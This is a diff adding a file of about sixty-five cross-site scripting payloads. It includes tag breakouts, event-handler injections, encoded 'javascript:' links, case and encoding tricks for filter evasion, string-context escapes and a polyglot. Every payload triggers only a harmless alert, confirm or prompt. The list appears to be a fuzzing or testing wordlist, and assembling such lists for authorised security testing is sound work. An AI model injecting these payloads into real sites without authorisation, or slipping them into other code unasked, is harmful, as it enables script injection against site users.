@@ -1,0 +1,65 @@
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+'"><svg/onload=alert(1)>
+"><svg/onload=alert(1)>
+javascript:alert(1)
+"><input autofocus onfocus=alert(1)>
+"><body onload=alert(1)>
+"><details open ontoggle=alert(1)>
+"><marquee onstart=alert(1)>
+"><video><source onerror=alert(1)>
+"><audio src onerror=alert(1)>
+<img src=x onerror=alert(1)//
+<img src=x onerror="alert(1)">
+<img/src/onerror=alert(1)>
+<img src=`x`onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg><script>alert(1)</script>
+<math><mtext><script>alert(1)</script>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<isindex type=image src=1 onerror=alert(1)>
+<x contenteditable onblur=alert(1)>x
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x ONERROR=alert(1)>
+<a href="&#106;avascript:alert(1)">x</a>
+<a href="jav&#x09;ascript:alert(1)">x</a>
+<a href="jav&#x0A;ascript:alert(1)">x</a>
+<iframe src="&#x6a;avascript:alert(1)">
+"><img src=x onerror=&#97;lert(1)>
+';alert(1)//
+";alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+"-alert(1)-"
+\';alert(1)//
+\";alert(1)//
+${alert(1)}
+`-alert(1)-`
+`;alert(1)//`
+</script><svg onload=alert(1)>
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" autofocus onfocus=alert(1) x="
+" onpointerenter=alert(1) x="
+<img src=x onerror=alert`1`>
+<img src=x onerror=(alert)(1)>
+<img src=x onerror=window['al'+'ert'](1)>
+<img src=x onerror=top[/al/.source+/ert/.source](1)>
+<svg onload=alert&#40;1&#41;>
+<svg onload=confirm(1)>
+<svg onload=prompt(1)>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<div style=width:100%;height:100%;position:fixed;left:0;top:0 onmouseover=alert(1)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'"><svg/onload=alert(String.fromCharCode(88,83,83))>
+-->'"/></title></style></textarea></script><details/open/ontoggle=alert(1)>
